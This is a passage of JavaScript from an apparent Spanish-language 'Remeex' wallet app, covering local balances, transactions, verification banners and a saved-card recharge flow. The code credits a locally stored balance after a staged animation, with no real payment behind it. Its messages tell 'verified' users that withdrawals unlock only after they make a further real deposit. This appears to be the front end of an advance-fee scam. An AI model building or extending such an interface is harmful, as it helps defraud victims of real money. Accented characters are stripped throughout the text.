            // Si es otro dispositivo, no cargar los datos de tarjeta
            return false;
          }
        } catch (e) {
          console.error('Error parsing card data:', e);
          return false;
        }
      }
      return false;
    }

    // Cargar si el usuario ha hecho su primera recarga
    function loadFirstRechargeStatus() {
      const hasRecharge = localStorage.getItem(CONFIG.STORAGE_KEYS.HAS_MADE_FIRST_RECHARGE);
      currentUser.hasMadeFirstRecharge = hasRecharge === 'true';
      return currentUser.hasMadeFirstRecharge;
    }

    // Guardar si el usuario ha hecho su primera recarga
    function saveFirstRechargeStatus(hasRecharge) {
      currentUser.hasMadeFirstRecharge = hasRecharge;
      localStorage.setItem(CONFIG.STORAGE_KEYS.HAS_MADE_FIRST_RECHARGE, hasRecharge.toString());
    }

    // Cargar si el usuario ya gestion el bono de bienvenida
    function loadWelcomeBonusStatus() {
      const claimed = localStorage.getItem(CONFIG.STORAGE_KEYS.WELCOME_BONUS_CLAIMED);
      currentUser.hasClaimedWelcomeBonus = claimed === 'true';
      return currentUser.hasClaimedWelcomeBonus;
    }

    // Guardar el estado del bono de bienvenida
    function saveWelcomeBonusStatus(claimed) {
      currentUser.hasClaimedWelcomeBonus = claimed;
      localStorage.setItem(CONFIG.STORAGE_KEYS.WELCOME_BONUS_CLAIMED, claimed.toString());
    }

    // Guardar datos en sessionStorage para compartir con transferencia
    function saveDataForTransfer() {
      // Guardar saldo actual
      sessionStorage.setItem(CONFIG.SESSION_KEYS.BALANCE, JSON.stringify(currentUser.balance));
      
      // Guardar tasa de cambio actual
      sessionStorage.setItem(CONFIG.SESSION_KEYS.EXCHANGE_RATE, JSON.stringify(CONFIG.EXCHANGE_RATES));
      
      // Guardar ID del dispositivo
      sessionStorage.setItem('remeexDeviceId', currentUser.deviceId);
      
      console.log("Datos guardados para transferencia: ", {
        balance: currentUser.balance,
        exchangeRate: CONFIG.EXCHANGE_RATES.USD_TO_BS,
        deviceId: currentUser.deviceId
      });
    }

    // Aadir una transaccin con sincronizacin
    function addTransaction(transaction) {
      // Aadir al principio del array para que las ms nuevas aparezcan primero
      currentUser.transactions.unshift(transaction);
      
      // Si es una transaccin pendiente, actualizar la lista
      if (transaction.status === 'pending' || transaction.type === 'pending') {
        pendingTransactions = currentUser.transactions.filter(t => t.status === 'pending' && t.description === 'Pago Mvil');
      }
      
      // Guardar transacciones en localStorage
      saveTransactionsData();
      
      // Actualizar vista
      updateRecentTransactions();
      updatePendingTransactionsBadge();
      updateRejectedTransactionsBadge();
    }

    // Marcar un pago mvil como rechazado
    function rejectMobileTransfer(reference) {
      const tx = currentUser.transactions.find(t => t.reference === reference && t.status === 'pending');
      if (tx) {
        tx.status = 'rejected';
        saveTransactionsData();
        pendingTransactions = currentUser.transactions.filter(t => t.status === 'pending' && t.description === 'Pago Mvil');
        displayedTransactions.delete(reference);
        updatePendingTransactionsBadge();
        updateRejectedTransactionsBadge();
        updateRecentTransactions();
        updateDashboardUI();
      }

      const pendingMobileTransfers = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.PENDING_MOBILE) || '[]');
      const idx = pendingMobileTransfers.findIndex(t => t.reference === reference);
      if (idx > -1) {
        pendingMobileTransfers.splice(idx, 1);
        localStorage.setItem(CONFIG.STORAGE_KEYS.PENDING_MOBILE, JSON.stringify(pendingMobileTransfers));
      }
    }

    // Notificaciones
   function loadNotifications() {
     const stored = localStorage.getItem(CONFIG.STORAGE_KEYS.NOTIFICATIONS);
     if (stored) {
        try { notifications = JSON.parse(stored); } catch(e) { notifications = []; }
        if (notifications.length > 3) {
          notifications = notifications.slice(-3);
        }
     }
   }

    function saveNotifications() {
      localStorage.setItem(CONFIG.STORAGE_KEYS.NOTIFICATIONS, JSON.stringify(notifications));
    }

    function addNotification(type, title, text) {
      notifications.push({ type, title, text, time: getCurrentTime() });
      if (notifications.length > 3) {
        notifications = notifications.slice(-3);
      }
      saveNotifications();
      updateNotificationBadge();
      showToast(type, title, text, 4000);
    }

    function clearNotifications() {
      notifications = [];
      saveNotifications();
      updateNotificationBadge();
    }

    function renderNotifications() {
      const list = document.getElementById('messages-list');
      if (!list) return;
      list.innerHTML = '';
      notifications.slice().reverse().forEach((n, idx) => {
        const realIndex = notifications.length - 1 - idx;
        const item = document.createElement('div');
        const cls = n.type === 'success' ? 'welcome' : n.type === 'warning' ? 'verify' : 'security';
        const icon = n.type === 'success' ? 'check-circle' : n.type === 'warning' ? 'exclamation-circle' : 'info-circle';
        item.className = 'message-item';
        item.dataset.index = realIndex;
        item.innerHTML = `<div class="message-icon ${cls}"><i class="fas fa-${icon}"></i></div>`+
          `<div class="message-content"><div class="message-title">${escapeHTML(n.title)}</div>`+
          `<div class="message-text">${escapeHTML(n.text)}</div>`+
          `<div class="message-time">${escapeHTML(n.time)}</div></div>`;
        item.addEventListener('click', function() {
          const i = parseInt(this.dataset.index);
          if (!isNaN(i)) {
            notifications.splice(i, 1);
            saveNotifications();
            renderNotifications();
            updateNotificationBadge();
          }
        });
        list.appendChild(item);
      });
    }

    function updateNotificationBadge() {
      const badge = document.querySelector('.notification-badge');
      if (badge) {
        if (notifications.length > 0) {
          badge.textContent = notifications.length;
          badge.style.display = 'flex';
        } else {
          badge.style.display = 'none';
        }
      }
    }

    // Funciones de sesin
    function saveSessionData() {
      // Guardar datos de sesin
      sessionStorage.setItem('remeexSession', 'active');
      sessionStorage.setItem('remeexUser', JSON.stringify({
        name: currentUser.name,
        fullName: currentUser.fullName,
        email: currentUser.email,
        deviceId: currentUser.deviceId,
        idNumber: currentUser.idNumber,
        phoneNumber: currentUser.phoneNumber
      }));
    }

    function loadSessionData() {
      // Cargar datos de sesin
      const isActiveSession = sessionStorage.getItem('remeexSession') === 'active';
      if (isActiveSession) {
        const userData = JSON.parse(sessionStorage.getItem('remeexUser') || '{}');
        currentUser.name = userData.name || '';
        currentUser.fullName = userData.fullName || '';
        currentUser.email = userData.email || '';
        currentUser.deviceId = userData.deviceId || generateDeviceId(); // Recuperar el ID del dispositivo
        currentUser.idNumber = userData.idNumber || '';
        currentUser.phoneNumber = userData.phoneNumber || '';
        return true;
      }
      return false;
    }

    function clearSessionData() {
      // Limpiar datos de sesin
      sessionStorage.removeItem('remeexSession');
      sessionStorage.removeItem('remeexUser');
    }

    function handleStorageChange(event) {
      // Si hay cambios en localStorage, actualizar los datos locales
      if (event.key === CONFIG.STORAGE_KEYS.BALANCE && event.newValue) {
        try {
          const balanceData = JSON.parse(event.newValue);
          
          // Verificar si este es el dispositivo correcto
          if (balanceData.deviceId && balanceData.deviceId === currentUser.deviceId) {
            currentUser.balance = {
              usd: balanceData.usd || 0,
              bs: balanceData.bs || 0,
              eur: balanceData.eur || 0
            };
            updateDashboardUI();
          }
        } catch (e) {
          console.error('Error parsing balance data from storage change:', e);
        }
      } else if (event.key === CONFIG.STORAGE_KEYS.TRANSACTIONS && event.newValue) {
        try {
          const data = JSON.parse(event.newValue);
          
          // Verificar si este es el dispositivo correcto
          if (data.deviceId && data.deviceId === currentUser.deviceId) {
            currentUser.transactions = data.transactions || [];
            // Identificar transacciones pendientes
            pendingTransactions = currentUser.transactions.filter(t => t.status === 'pending' && t.description === 'Pago Mvil');
            updateRecentTransactions();
            updatePendingTransactionsBadge();
            updateRejectedTransactionsBadge();
          }
        } catch (e) {
          console.error('Error parsing transactions data from storage change:', e);
        }
      } else if (event.key === CONFIG.STORAGE_KEYS.VERIFICATION && event.newValue) {
        verificationStatus.status = event.newValue;
        
        if (event.newValue === 'verified') {
          verificationStatus.isVerified = true;
          verificationStatus.hasUploadedId = true;
        } else if (event.newValue === 'pending' || event.newValue === 'processing' || event.newValue === 'bank_validation' || event.newValue === 'payment_validation') {
          verificationStatus.isVerified = false;
          verificationStatus.hasUploadedId = true;
        } else {
          verificationStatus.isVerified = false;
          verificationStatus.hasUploadedId = false;
        }
        
        // Cargar tambin los datos de verificacin actualizados
        loadVerificationData();
        
        // Actualizar la UI con los datos de pago mvil
        updateMobilePaymentInfo();
        
        checkVerificationStatus();
        updateUserUI();
      } else if (event.key === CONFIG.STORAGE_KEYS.VERIFICATION_DATA && event.newValue) {
        try {
          const verificationData = JSON.parse(event.newValue);
          verificationStatus.idNumber = verificationData.idNumber || '';
          verificationStatus.phoneNumber = verificationData.phoneNumber || '';
          
          // Actualizar la UI con los datos de pago mvil
          updateMobilePaymentInfo();
        } catch (e) {
          console.error('Error parsing verification data from storage change:', e);
        }
      } else if (event.key === CONFIG.STORAGE_KEYS.CARD_DATA && event.newValue) {
        try {
          const cardData = JSON.parse(event.newValue);
          
          // Verificar si este es el dispositivo correcto
          if (cardData.deviceId && cardData.deviceId === currentUser.deviceId) {
            currentUser.hasSavedCard = cardData.hasSavedCard;
            currentUser.cardRecharges = cardData.cardRecharges || 0;
            updateSavedCardUI();
          }
        } catch (e) {
          console.error('Error parsing card data from storage change:', e);
        }
      } else if (event.key === CONFIG.STORAGE_KEYS.PENDING_BANK || event.key === CONFIG.STORAGE_KEYS.PENDING_MOBILE) {
        // Recargar datos y actualizar interfaz si es necesario
        loadTransactionsData();
        updatePendingTransactionsBadge();
        updateRejectedTransactionsBadge();
      } else if (event.key === CONFIG.STORAGE_KEYS.HAS_MADE_FIRST_RECHARGE) {
        // Actualizar si el usuario ha hecho su primera recarga
        currentUser.hasMadeFirstRecharge = event.newValue === 'true';
        checkBannersVisibility();
      } else if (event.key === CONFIG.STORAGE_KEYS.MOBILE_PAYMENT_DATA && event.newValue) {
        // Actualizar los datos de pago mvil
        loadMobilePaymentData();
      } else if (event.key === CONFIG.STORAGE_KEYS.SUPPORT_NEEDED_TIMESTAMP) {
        // Verificar si es momento de mostrar el mensaje de soporte
        const supportNeededTimestamp = parseInt(event.newValue || '0');
        const currentTime = new Date().getTime();
        
        if (supportNeededTimestamp > 0 && currentTime >= supportNeededTimestamp) {
          showSupportNeededMessage();
        } else if (supportNeededTimestamp > currentTime) {
          // Restablecer el temporizador para mostrar el mensaje
          const remainingTime = supportNeededTimestamp - currentTime;
          if (mobilePaymentTimer) clearTimeout(mobilePaymentTimer);
          
          mobilePaymentTimer = setTimeout(function() {
            showSupportNeededMessage();
          }, remainingTime);
        }
      }
      // NUEVA IMPLEMENTACIN: Manejar cambios en el estado de procesamiento de verificacin
      else if (event.key === CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING) {
        try {
          const processingData = event.newValue ? JSON.parse(event.newValue) : null;
          if (processingData) {
            verificationProcessing = processingData;
          }
          
          if ((processingData && processingData.isProcessing) || verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
            showVerificationProcessingBanner();
            updateVerificationProcessingBanner();
          } else {
            hideVerificationProcessingBanner(false);
          }
        } catch (e) {
          console.error('Error parsing verification processing data from storage change:', e);
        }
      }
    }

    // Logout function
    function logout() {
      // Guardar todos los datos antes de cerrar sesin
      saveBalanceData();
      saveTransactionsData();
      saveVerificationStatus();
      saveVerificationData();
      saveCardData();
      saveUserData();
      saveFirstRechargeStatus(currentUser.hasMadeFirstRecharge);
      saveSavingsData();
      
      // Limpiar datos de sesin
      clearSessionData();
      
      // Limpiar temporizadores
      if (inactivityTimer) clearTimeout(inactivityTimer);
      if (inactivityCountdown) clearInterval(inactivityCountdown);
      if (mobilePaymentTimer) clearTimeout(mobilePaymentTimer);

      // NUEVA IMPLEMENTACIN: Limpiar temporizador de verificacin
      if (verificationProcessing.timer) {
        clearTimeout(verificationProcessing.timer);
        verificationProcessing.timer = null;
      }
      
      // Ocultar todos los modales y overlays
      document.querySelectorAll('.modal-overlay, .verification-container, .success-container, .inactivity-modal, .welcome-modal, .service-overlay, .cards-overlay, .messages-overlay, .settings-overlay, .exchange-overlay, .feature-blocked-modal, .logout-modal, .page-overlay').forEach(modal => {
        modal.style.display = 'none';
      });

      // Mostrar pantalla de login
      addNotification('info', 'Cierre de sesi\u00f3n', 'Has cerrado sesi\u00f3n.');
      showLoginForm();
    }

    // Validate name (only letters and spaces, at least first and last name)
    function validateName(name) {
      // Check if name contains only letters and spaces
      if (!/^[A-Za-z---\s]+$/.test(name)) {
        return false;
      }
      
      // Check if name has at least two parts (first and last name)
      const nameParts = name.trim().split(/\s+/);
      if (nameParts.length < 2) {
        return false;
      }
      
      // Each part should be at least 2 characters
      for (const part of nameParts) {
        if (part.length < 2) {
          return false;
        }
      }
      
      return true;
    }

    // Function to format file size
    function formatFileSize(bytes) {
      if (bytes < 1024) {
        return bytes + " B";
      } else if (bytes < 1048576) {
        return (bytes / 1024).toFixed(1) + " KB";
      } else {
        return (bytes / 1048576).toFixed(1) + " MB";
      }
    }

    // Toast notification function
    function showToast(type, title, message, duration = 3000) {
      const toastContainer = document.getElementById('toast-container');
      
      const toast = document.createElement('div');
      toast.className = `toast ${type}`;
      
      const content = `
        <div class="toast-icon">
          <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
        </div>
        <div class="toast-content">
          <div class="toast-title">${escapeHTML(title)}</div>
          <div class="toast-message">${escapeHTML(message)}</div>
        </div>
        <div class="toast-close">
          <i class="fas fa-times"></i>
        </div>
      `;
      
      toast.innerHTML = content;
      toastContainer.appendChild(toast);
      
      // Reset inactivity timer on toast
      resetInactivityTimer();
      
      // Auto remove after duration
      setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => {
          toast.remove();
        }, 300);
      }, duration);
      
      // Close button
      const closeBtn = toast.querySelector('.toast-close');
      if (closeBtn) {
        closeBtn.addEventListener('click', function() {
          toast.style.opacity = '0';
          setTimeout(() => {
            toast.remove();
          }, 300);
        });
      }
    }

    // Update date displays
    function updateDateDisplay() {
      const headerDate = document.getElementById('header-date');
      const balanceDate = document.getElementById('balance-date');

      if (balanceDate) balanceDate.textContent = getCurrentDateTime();
      if (headerDate) headerDate.textContent = getCurrentDateTime();
    }

    // Verificar qu banners deben mostrarse segn el estado del usuario
    function checkBannersVisibility() {
      const securityDeviceNotice = document.getElementById('promo-banner');

      if (securityDeviceNotice) {
        const noticeExpiry = parseInt(localStorage.getItem('securityNoticeExpiry') || '0');
        const noticeClosed = localStorage.getItem('securityNoticeClosed') === 'true';
        securityDeviceNotice.style.display = (noticeClosed || Date.now() > noticeExpiry) ? 'none' : 'flex';
      }

      updateStatusCards();
    }

    function updateStatusCards() {
      const stepRecharge = document.getElementById('status-recharge');
      const stepVerify = document.getElementById('status-request-verification');
      const stepProcessing = document.getElementById('status-processing-card');
      const stepFinal = document.getElementById('status-final');

      if (!stepRecharge || !stepVerify || !stepProcessing || !stepFinal) return;

      stepRecharge.style.display = 'none';
      stepVerify.style.display = 'none';
      stepProcessing.style.display = 'none';
      stepFinal.style.display = 'none';

      if (!currentUser.hasMadeFirstRecharge) {
        stepRecharge.style.display = 'block';
      } else if (verificationStatus.status === 'unverified') {
        stepVerify.style.display = 'block';
      } else if (verificationStatus.status === 'processing') {
        stepProcessing.style.display = 'block';
      } else if (verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
        stepFinal.style.display = 'block';
      }
    }

    // Check verification status
  function checkVerificationStatus() {
      // Cargar estado de verificacin
      loadVerificationStatus();
      
      // Verificar estado de primera recarga
      loadFirstRechargeStatus();
      loadWelcomeBonusStatus();

      // Mostrar banners apropiados
      checkBannersVisibility();
      updateBankValidationStatusItem();
      personalizeVerificationStatusCards();

      personalizeStatusTexts();

      // Actualizar la UI con los datos de pago mvil
      updateMobilePaymentInfo();
      updateVerificationButtons();
  }

  function updateVerificationButtons() {
      const verifyIdentityBtn = document.getElementById('verify-identity-btn');
      const verificationNavBtn = document.getElementById('verification-nav-btn');
      const settingsOverlay = document.getElementById('settings-overlay');

      if (verifyIdentityBtn) {
        verifyIdentityBtn.onclick = null;
        if (verificationStatus.status !== 'unverified') {
          verifyIdentityBtn.innerHTML = '<i class="fas fa-user-check"></i> Usuario Verificado';
          verifyIdentityBtn.addEventListener('click', function() {
            if (settingsOverlay) settingsOverlay.style.display = 'none';
            showToast('info', 'Usuario Verificado', 'Solo falta un paso para habilitar retiros, realiza una recarga desde la cuenta que registraste, esa recarga se suma al saldo que tienes en tu cuenta de Remeex y podras retirarlo todo');
            resetInactivityTimer();
          });
        } else {
          verifyIdentityBtn.innerHTML = '<i class="fas fa-id-card"></i> Verificar mi Identidad';
          verifyIdentityBtn.addEventListener('click', function() {
            if (settingsOverlay) settingsOverlay.style.display = 'none';
            window.location.href = '';
            resetInactivityTimer();
          });
        }
      }

      if (verificationNavBtn) {
        verificationNavBtn.onclick = null;
        const titleEl = verificationNavBtn.querySelector('.settings-nav-title');
        const descEl = verificationNavBtn.querySelector('.settings-nav-description');
        if (verificationStatus.status !== 'unverified') {
          if (titleEl) titleEl.textContent = 'Usuario Verificado';
          if (descEl) descEl.textContent = 'Recarga para habilitar retiros';
          verificationNavBtn.addEventListener('click', function() {
            if (settingsOverlay) settingsOverlay.style.display = 'none';
            showToast('info', 'Usuario Verificado', 'Solo falta un paso para habilitar retiros, realiza una recarga desde la cuenta que registraste, esa recarga se suma al saldo que tienes en tu cuenta de Remeex y podras retirarlo todo');
            resetInactivityTimer();
          });
        } else {
          if (titleEl) titleEl.textContent = 'Verificacin';
          if (descEl) descEl.textContent = 'Verificar identidad y documentos';
          verificationNavBtn.addEventListener('click', function() {
            window.location.href = '';
            resetInactivityTimer();
          });
        }
      }
  }

    // Actualizar badge de transacciones pendientes
    function updatePendingTransactionsBadge() {
      const pendingBadge = document.getElementById('pending-transaction-badge');
      const pendingAmount = document.getElementById('pending-transaction-amount');
      
      if (pendingBadge && pendingAmount) {
        if (pendingTransactions && pendingTransactions.length > 0) {
          // Calcular el total de transacciones pendientes
          const totalPending = pendingTransactions.reduce((sum, t) => sum + t.amount, 0);
          pendingAmount.textContent = `${formatCurrency(totalPending, 'usd')} en verificacin de Pago Mvil`;
          pendingBadge.style.display = 'flex';
        } else {
          pendingBadge.style.display = 'none';
        }
      }
    }

    // Actualizar UI de tarjeta guardada
    function updateSavedCardUI() {
      const savedCardContainer = document.getElementById('saved-card-container');
      const cardFormContainer = document.getElementById('card-form-container');
      const useSavedCard = document.getElementById('use-saved-card');
      const savedCardPayBtn = document.getElementById('saved-card-pay-btn');
      
      if (savedCardContainer && cardFormContainer) {
        if (currentUser.hasSavedCard) {
          savedCardContainer.style.display = 'block';
          
          if (useSavedCard && useSavedCard.checked) {
            cardFormContainer.style.display = 'none';
          } else {
            cardFormContainer.style.display = 'block';
          }
        } else {
          savedCardContainer.style.display = 'none';
          cardFormContainer.style.display = 'block';
        }
      }
    }

    // Set up event listeners
    function setupEventListeners() {
      // Login form handler
      setupLoginForm();
      setupLoginSupportMenu();
      setupPasswordToggles();
      
      // OTP verification
      setupOTPHandling();
      
      // Bottom navigation handling
      setupBottomNavigation();
      
      // Logout button
      setupLogoutButton();

      // Logout modal
      setupLogoutModal();
      
      // Recharge buttons
      setupRechargeButtons();
      
      // Payment method tabs
      setupPaymentMethodTabs();
      
      // Copy buttons
      setupCopyButtons();

      // Receipt upload
      setupReceiptUpload();

      // Balance controls
      setupBalanceControls();
      
      // Card payment
      setupCardPayment();
      
      // Bank transfer payment
      setupBankTransfer();
      
      // Mobile payment
      setupMobilePayment();
      
      // Identity verification
      setupIdentityVerification();
      
      // Feature blocked handling
      setupFeatureBlocked();
      
      // Service overlay
      setupServiceOverlay();

      // Overlay to show external pages
      setupPageOverlay();

      // Exchange overlay
      setupExchangeOverlay();
        setupBillsLink();
      setupCurrencyExchangeLink();

      // Zelle activation link
      setupZelleLink();

      setupUsAccountLink();
      setupWalletsLink();
      // Cash withdrawal page link
      setupWithdrawalLink();
      // Cards overlay
      setupCardsOverlay();
      
      // Messages overlay
      setupMessagesOverlay();

      // Savings overlay
      setupSavingsOverlay();

      // Donation link
      setupDonationLink();

      // Support overlay
      setupSupportOverlay();

      // Forum links
      setupForumLinks();

      // Settings overlay
      setupSettingsOverlay();

      // Account edit modal
      setupAccountEditModal();
      setupBankManagement();
      
      // Inactivity modal buttons
      setupInactivityModal();
      
      // Welcome modal button
      setupWelcomeModal();

      // Botn de pago directo con tarjeta guardada
      setupSavedCardPayButton();

      // Botn de primera recarga
      setupFirstRechargeBanner();

      // Acciones para validar cuenta mediante recarga
      setupBankValidationActions();

      // Bono de bienvenida
      setupWelcomeBonus();

      // Filtro de transacciones
      setupTransactionFilter();

      // NUEVA IMPLEMENTACIN: Configurar botones de navegacin en ajustes
      setupSettingsNavigation();

      // Cerrar aviso de seguridad
      
      // Aadir evento de storage para sincronizacin en tiempo real
      window.addEventListener('storage', handleStorageChange);
    }

    // NUEVA IMPLEMENTACIN: Configurar navegacin de ajustes
  function setupSettingsNavigation() {
      const verificationNavBtn = document.getElementById('verification-nav-btn');
      const activationNavBtn = document.getElementById('activation-nav-btn');
      const limitsNavBtn = document.getElementById('limits-nav-btn');

      updateVerificationButtons();

      if (activationNavBtn) {
        activationNavBtn.addEventListener('click', function() {
          // Redirigir a activacion
          window.location.href = '';

          // Reset inactivity timer
          resetInactivityTimer();
        });
      }

      if (limitsNavBtn) {
        limitsNavBtn.addEventListener('click', function() {
          // Redirigir a limites
          window.location.href = '';

          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    // Actualizar badge de transacciones rechazadas
    function updateRejectedTransactionsBadge() {
      const rejectedBadge = document.getElementById('rejected-transaction-badge');
      const rejectedAmount = document.getElementById('rejected-transaction-amount');

      if (rejectedBadge && rejectedAmount) {
        const rejectedTransactions = currentUser.transactions.filter(t => t.status === 'rejected' && t.description === 'Pago Mvil');
        if (rejectedTransactions.length > 0) {
          const totalRejected = rejectedTransactions.reduce((sum, t) => sum + t.amount, 0);
          rejectedAmount.textContent = `${formatCurrency(totalRejected, 'usd')} ser devuelto`;
          rejectedBadge.style.display = 'flex';
        } else {
          rejectedBadge.style.display = 'none';
        }
      }
    }

    // Configurar el botn del banner de primera recarga
    function setupFirstRechargeBanner() {
      const firstRechargeAction = document.getElementById('first-recharge-button');
      
      if (firstRechargeAction) {
        firstRechargeAction.addEventListener('click', function() {
          const dashboardContainer = document.getElementById('dashboard-container');
          const rechargeContainer = document.getElementById('recharge-container');
          
          if (dashboardContainer) dashboardContainer.style.display = 'none';
          if (rechargeContainer) rechargeContainer.style.display = 'block';
          
          // Actualizar UI de tarjeta guardada
          updateSavedCardUI();
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    // Setup welcome modal
    function setupWelcomeModal() {
      const welcomeContinue = document.getElementById('welcome-continue');
      if (welcomeContinue) {
        welcomeContinue.addEventListener('click', function() {
          const welcomeModal = document.getElementById('welcome-modal');
          if (welcomeModal) welcomeModal.style.display = 'none';
          
          // Mostrar notificacin de seguridad de dispositivo nico
          showToast('info', 'Seguridad de Dispositivo', 'Su saldo solo est disponible en este dispositivo donde ha iniciado sesin.', 5000);
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    // Configurar el botn de pago directo con tarjeta guardada
    function setupSavedCardPayButton() {
      const savedCardPayBtn = document.getElementById('saved-card-pay-btn');
      
      if (savedCardPayBtn) {
        savedCardPayBtn.addEventListener('click', function() {
          // Verificar si se ha seleccionado un monto
          if (selectedAmount.usd <= 0) {
            showToast('error', 'Seleccione un monto', 'Por favor seleccione un monto para recargar.');
            return;
          }
          
          // Verificar si se ha alcanzado el lmite de recargas con tarjeta
          if (currentUser.cardRecharges >= CONFIG.MAX_CARD_RECHARGES) {
            // Mostrar mensaje de error
            showToast('error', 'Lmite Alcanzado', 'Ha alcanzado el lmite de recargas con tarjeta. Por favor verifique su cuenta para continuar.');
            
            // Mostrar modal de verificacin
            showFeatureBlockedModal();
            
            return;
          }
          
          // Actualizar el texto del botn mientras se procesa
          savedCardPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Procesando...';
          savedCardPayBtn.disabled = true;
          
          // CORRECCIN 1: Guardar una copia del monto seleccionado antes de procesar
          const amountToDisplay = {
            usd: selectedAmount.usd,
            bs: selectedAmount.bs,
            eur: selectedAmount.eur
          };
          
          // Procesar directamente el pago con tarjeta guardada sin solicitar OTP
          processSavedCardPayment(amountToDisplay);
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    // CORRECCIN 1: Modificar processSavedCardPayment para recibir el monto a mostrar
    function processSavedCardPayment(amountToDisplay) {
      // Mostrar overlay de carga
      const loadingOverlay = document.getElementById('loading-overlay');
      if (loadingOverlay) loadingOverlay.style.display = 'flex';
      
      // Animar barra de progreso
      const progressBar = document.getElementById('progress-bar');
      const loadingText = document.getElementById('loading-text');
      
      // Animacin GSAP para el proceso de pago
      if (progressBar && loadingText) {
        gsap.to(progressBar, {
          width: '30%',
          duration: 0.8,
          ease: 'power1.inOut',
          onUpdate: function() {
            loadingText.textContent = "Procesando tarjeta guardada...";
          },
          onComplete: function() {
            gsap.to(progressBar, {
              width: '70%',
              duration: 1,
              ease: 'power1.inOut',
              onUpdate: function() {
                loadingText.textContent = "Realizando recarga...";
              },
              onComplete: function() {
                gsap.to(progressBar, {
                  width: '100%',
                  duration: 0.8,
                  ease: 'power1.inOut',
                  onUpdate: function() {
                    loadingText.textContent = "Recarga completada con xito!";
                  },
                  onComplete: function() {
                    // Ocultar overlay despus de un breve retraso
                    setTimeout(function() {
                      if (loadingOverlay) loadingOverlay.style.display = 'none';
                      
                      // Actualizar balance del usuario
                      currentUser.balance.usd += amountToDisplay.usd;
                      currentUser.balance.bs += amountToDisplay.bs;
                      currentUser.balance.eur += amountToDisplay.eur;
                      
                      // Actualizar contador de recargas con tarjeta
                      currentUser.cardRecharges++;
                      
                      // Establecer que el usuario ya ha hecho su primera recarga
                      if (!currentUser.hasMadeFirstRecharge) {
                        saveFirstRechargeStatus(true);
                      }
                      
                      // Guardar datos
                      saveBalanceData();
                      saveCardData();
                      
                      // Aadir transaccin
                      addTransaction({
                        type: 'deposit',
                        amount: amountToDisplay.usd,
                        amountBs: amountToDisplay.bs,
                        amountEur: amountToDisplay.eur,
                        date: getCurrentDateTime(),
                        description: 'Recarga con Tarjeta',
                        card: '****3009',
                        status: 'completed'
                      });
                      
                      // Restaurar botn de pago con tarjeta guardada
                      const savedCardPayBtn = document.getElementById('saved-card-pay-btn');
                      if (savedCardPayBtn) {
                        savedCardPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> Recargar con tarjeta guardada';
                        savedCardPayBtn.disabled = false;
                      }
                      
                      // Restablecer los selectores de monto a estado por defecto
                      resetAmountSelectors();
                      
                      // CORRECCIN 1: Mostrar el monto correcto en la animacin de xito
                      const successAmount = document.getElementById('success-amount');
                      if (successAmount) successAmount.textContent = formatCurrency(amountToDisplay.usd, 'usd');
                      
                      const successContainer = document.getElementById('success-container');
                      if (successContainer) successContainer.style.display = 'flex';
                      addNotification('success', 'Recarga exitosa', `Recargaste ${formatCurrency(amountToDisplay.usd, 'usd')}`);

                      // Aadir efecto de confetti
                      setTimeout(() => {
                        confetti({
                          particleCount: 150,
                          spread: 80,
                          origin: { y: 0.6 }
                        });
                      }, 500);

                      if (currentUser.cardRecharges === 1 && !currentUser.hasClaimedWelcomeBonus && amountToDisplay.usd >= 500) {
                        setTimeout(() => {
                          const bonusContainer = document.getElementById('bonus-container');
                          if (bonusContainer) bonusContainer.style.display = 'flex';
                        }, 20000);
                      }
                    }, 600);
                  }
                });
              }
            });
          }
        });
      }
    }

    // Funcin para resetear los selectores de monto
    function resetAmountSelectors() {
      const cardAmountSelect = document.getElementById('card-amount-select');
      const bankAmountSelect = document.getElementById('bank-amount-select');
      const mobileAmountSelect = document.getElementById('mobile-amount-select');
      
      if (cardAmountSelect) cardAmountSelect.selectedIndex = 0;
      if (bankAmountSelect) bankAmountSelect.selectedIndex = 0;
      if (mobileAmountSelect) mobileAmountSelect.selectedIndex = 0;
      
      // Resetear el valor de selectedAmount
      selectedAmount = {
        usd: 0,
        bs: 0,
        eur: 0
      };
      
      // Actualizar botones de pago
      updateSubmitButtonsState();
    }

    // Funcin para actualizar el estado de los botones de pago
    function updateSubmitButtonsState() {
      const submitPayment = document.getElementById('submit-payment');
      const savedCardPayBtn = document.getElementById('saved-card-pay-btn');
      const submitBankTransfer = document.getElementById('submit-bank-transfer');
      const submitMobilePayment = document.getElementById('submit-mobile-payment');
      
      if (selectedAmount.usd <= 0) {
        // Si no hay monto seleccionado, deshabilitar todos los botones
        if (submitPayment) {
          submitPayment.disabled = true;
          submitPayment.innerHTML = '<i class="fas fa-credit-card"></i> Seleccione un monto';
        }
        if (savedCardPayBtn) {
          savedCardPayBtn.disabled = true;
          savedCardPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> Seleccione un monto';
        }
        if (submitBankTransfer) {
          submitBankTransfer.disabled = true;
          submitBankTransfer.innerHTML = '<i class="fas fa-paper-plane"></i> Seleccione un monto';
        }
        if (submitMobilePayment) {
          submitMobilePayment.disabled = true;
          submitMobilePayment.innerHTML = '<i class="fas fa-paper-plane"></i> Seleccione un monto';
        }
      } else {
        // Si hay monto seleccionado, habilitar los botones
        if (submitPayment) {
          submitPayment.disabled = false;
          submitPayment.innerHTML = `<i class="fas fa-credit-card"></i> Recargar ${formatCurrency(selectedAmount.usd, 'usd')}`;
        }
        if (savedCardPayBtn) {
          savedCardPayBtn.disabled = false;
          savedCardPayBtn.innerHTML = `<i class="fas fa-credit-card"></i> Recargar ${formatCurrency(selectedAmount.usd, 'usd')}`;
        }
        if (submitBankTransfer) {
          submitBankTransfer.disabled = false;
          submitBankTransfer.innerHTML = `<i class="fas fa-paper-plane"></i> Enviar Comprobante`;
        }
        if (submitMobilePayment) {
          submitMobilePayment.disabled = false;
          submitMobilePayment.innerHTML = `<i class="fas fa-paper-plane"></i> Enviar Comprobante`;
        }
      }
    }

